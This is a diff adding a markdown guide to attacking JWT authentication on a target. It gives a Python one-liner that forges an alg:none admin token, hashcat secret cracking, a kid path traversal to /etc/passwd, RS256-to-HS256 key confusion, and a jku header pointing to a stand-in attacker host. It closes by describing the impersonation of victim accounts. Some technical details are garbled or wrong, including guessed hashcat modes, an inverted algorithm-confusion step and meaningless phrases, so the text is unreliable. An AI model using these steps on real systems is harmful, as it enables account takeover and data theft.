@@ -1,0 +1,49 @@
+# HOW TO TEST JWT ATTACKS ON A TARGET (2026 expert guide)
+
+## The N ways to test
+1. alg:none accept: header {"alg":"none"} -> attacker signs nothing, server trusts.
+2. Weak secret brute: HS256 with rockyou -> jwt_tool / hashcat -m 16500.
+3. Algorithm confusion RS->HS: public key as HMAC secret (if server only verifies signature with pub key).
+4. kid header injection: kid = path to a file we set (sqlite clone), or kid=../../... to read keys.
+5. jku/x5u header: host a JWK at YOUR URL if server fetches it.
+6. Key confusion: "typ JWT"/"alg HS512" mixing, exp/iat/nbf tolerance and unit confusion.
+7. Replay/jitter: token accepted beyond exp when server has lax leeway.
+8. CBOR/JWS variants; ECDSA malleability (rare).
+9. Signature omitted entirely (some parsers skip verification on missing sig).
+10. Multi-key: alg=RSA but payload signed with any of several; attacker registers a key.
+
+## Step-by-step on target
+1. Grab your token and split the 3 parts (base64url), read header alg + kid/jku/x5u.
+2. Try alg:none (drop sig). If "Invalid token" -> then weak-secret brute.
+3. Brute: hashcat -m 16500 token.txt rockyou.txt  (HS256) / -m 11500 (HS384?) - use jwt tool.
+4. kid test: kid="../../../../../../etc/passwd"  -> if you get a different error vs random = leak path.
+5. Confusion: set alg to RS and sign using the app's public JWK converted to HMAC key.
+   (jwt_tool: -X a -pk public.pem)
+6. Probe the claim boundary: set exp to far future OR leave unsigned, both page-flip.
+7. Check /userinfo error verbosity: 401 "kid not found" exposes header handling.
+
+## Worked examples (concrete)
+# alg:none (drop signature part):
+python3 -c "
+import base64,json
+h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+p=base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
+print(h+'.'+p+'.')"
+# weak secret brute (HS256 -> -m 16500; HS384 -> -m 16510?):
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+# kid path-travel (if server uses kid to pick a file/DB):
+"kid": "../../../../../../etc/passwd"
+# RS256->HS256 confusion:
+jwt_tool token.txt -X a -pk https://target.com/.well-known/jwks.json  # PK as HMAC secret
+# jku header trick:
+{"alg":"RS256","typ":"JWT","jku":"https://evil.c0t/YOUR-JWK.json"}
+# exp bypass with leeway (try +60s):
+exp=now+60  -> if accepted, note the config laxity.
+
+## False positives
+- Token with alg:none rejected = patched; keep testing secret-strength.
+- Weak secret found but only for YOUR user = still meaningful if you can forge admin sub.
+- Proof: change the sub to another victim id, get 200 with THEIR data = full account impersonation.
+
+## Tools
+- jwt_tool (jwt.io dev), hashcat/john mode 16500, jwtcat, python-jose, Burp BApp "JWT (twoseclab)".
